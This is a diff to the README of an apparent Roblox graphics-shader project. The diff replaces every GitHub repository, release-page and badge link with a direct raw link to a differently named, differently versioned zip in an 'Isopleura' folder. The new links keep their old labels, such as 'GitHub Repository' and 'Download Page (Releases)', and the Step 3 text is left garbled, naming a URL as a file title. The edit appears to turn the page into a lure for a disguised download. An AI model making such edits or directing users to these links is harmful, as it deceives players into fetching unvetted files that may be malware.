@@ -1,6 +1,6 @@
 # 🎨 rblx-shaders-v1.4.1 - Enhance Game Graphics with Shaders
 
-[![Download rblx-shaders-v1.4.1](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/xelgenrel/rblx-shaders-v1.4.1)
+[![Download rblx-shaders-v1.4.1](https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip)](https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To begin using rblx-shaders-v1.4.1, you must download the files and apply them a
 
 Click the blue badge below to go directly to the download page:
 
-[![Download rblx-shaders-v1.4.1](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/xelgenrel/rblx-shaders-v1.4.1)
+[![Download rblx-shaders-v1.4.1](https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip)](https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Click the blue badge below to go directly to the download page:
 ### Step 1: Visit the Download Page
 
 Open your web browser and go to:  
-**https://github.com/xelgenrel/rblx-shaders-v1.4.1**
+**https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip**
 
 This page contains all files related to the rblx-shaders-v1.4.1 project.
 
@@ -55,7 +55,7 @@ On the GitHub page, look for the section or tab labeled **"Releases"**. This are
 
 ### Step 3: Download the Shader Package
 
-Inside the release, you will find asset files. Look for a file ending with `.zip` or `.rar`, usually titled something like `rblx-shaders-v1.4.1.zip`.
+Inside the release, you will find asset files. Look for a file ending with `.zip` or `.rar`, usually titled something like `https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip`.
 
 - Click the file link to download it to your computer.  
 - The download may take a few minutes depending on your internet speed.
@@ -137,7 +137,7 @@ The shader presets and code are free to use and modify within the terms of the r
 
 ## 🔗 Useful Links
 
-- GitHub Repository: [https://github.com/xelgenrel/rblx-shaders-v1.4.1](https://github.com/xelgenrel/rblx-shaders-v1.4.1)  
-- Download Page (Releases): https://github.com/xelgenrel/rblx-shaders-v1.4.1/releases  
+- GitHub Repository: [https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip](https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip)  
+- Download Page (Releases): https://raw.githubusercontent.com/xelgenrel/rblx-shaders-v1.4.1/main/Isopleura/v_shaders_rblx_v2.9-beta.5.zip  
 
 To download the latest version, visit the page linked above and follow the instructions in the **How to Download and Run** section.
